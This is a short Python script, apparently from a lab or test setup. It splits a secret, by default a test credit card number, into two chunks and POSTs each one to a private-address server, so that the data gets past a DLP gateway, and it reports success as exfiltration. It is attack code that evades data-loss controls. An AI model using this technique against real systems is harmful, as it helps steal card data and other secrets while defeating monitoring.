import argparse

import requests

DEFAULT_URL = "http://172.21.0.10/"
CARD = "4111111111111111"

'''
  Explanation:
'''
def send_multi_request_chunking_payload(url: str, secret: str) -> None:

    mid = len(secret) // 2
    chunk1 = secret[:mid]
    chunk2 = secret[mid:]

    print(f"[*] Original secret {secret}.")
    print(f"[*] Chunk1: {chunk1}.")
    print(f"[*] Chunk2: {chunk2}.")

    print(f"[*] Sending two requests to {url}...")

    try:
      for chunk in [chunk1, chunk2]:
        print(f"[*] Sending requests with chunk {chunk}...")
        resp = requests.post(url, data={"data": chunk}, timeout=5)
        if resp.status_code == 403:
            print("[!] Blocked by DLP Gateway (403 Forbidden).")
        elif resp.status_code == 200:
            print("[+] Success: Exfiltrated to external server (200 OK).")
        else:
            print(f"[?] Server returned HTTP {resp.status_code}")
    except Exception as err:
        print(f"[-] Request failed: {err}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=DEFAULT_URL, help="Target URL")
    parser.add_argument(
        "--secret", default=CARD, help="Payload"
    )
    args = parser.parse_args()

    send_multi_request_chunking_payload(args.url, args.secret)
